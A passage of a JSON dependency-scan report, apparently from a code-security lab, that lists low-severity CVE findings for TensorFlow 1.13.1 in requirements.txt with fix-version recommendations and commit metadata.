            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29531 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29531](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29531)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "5d0c7b05db91bffc1328065ee542740d62fcd53a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29600",
          "ruleIndex": 127,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29600 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29600](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29600)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "39ea0fad21683b2f6f3757d9dc5bf60320d3ac63"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29615",
          "ruleIndex": 128,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29615 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29615](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29615)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "1148d0c8ff3a48bfc400c1dd22b06a141b5a911e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29610",
          "ruleIndex": 129,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29610 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29610](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29610)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c26eefb7ab29321798355e9b61ffdeb852d889e7"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29534",
          "ruleIndex": 130,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29534 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29534](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29534)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c90a9997f4e911e0d4a8cf6825e1cf48757c9443"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29568",
          "ruleIndex": 131,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29568 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29568](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29568)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "d5b1c61dad72d429f096b8329919a53668122e68"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29596",
          "ruleIndex": 132,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29596 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29596](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29596)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "01db6c31851c831603a1947f92fe58e9ed9be354"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29542",
          "ruleIndex": 133,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29542 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29542](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29542)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "b23d3a06a55034767b0a7a525af6e9dbfa71aa7b"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29583",
          "ruleIndex": 134,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29583 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29583](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29583)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "b851a767dd100837a48f91c422b7dd17a56c8e02"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29550",
          "ruleIndex": 135,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29550 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29550](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29550)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "f664b0b3673b80bf0614f54158a97d3e73b3d8d3"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29528",
          "ruleIndex": 136,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29528 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29528](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29528)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "a47c6c682334cb5fcd7ff49c918ff2bce45369ff"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29582",
          "ruleIndex": 137,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29582 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29582](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29582)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "9db3eb8b1f3a34b296afad19ce0e8f6a85fd386b"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29558",
          "ruleIndex": 138,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29558 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29558](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29558)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "f9758c8803908aff18a1ec4794789a26bf1b41b8"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29522",
          "ruleIndex": 139,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29522 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29522](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29522)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "21cc93b8b813f979b8483fb158340089c653cdfb"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29546",
          "ruleIndex": 140,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29546 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29546](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29546)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "278142c3dd7907534bafa9fe44722a3fa3f3245e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29520",
          "ruleIndex": 141,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29520 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29520](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29520)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "1e1db18e15b8fbb794c0ca00b39c93e957a82673"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29529",
          "ruleIndex": 142,
          "level": "note",
          "message": {
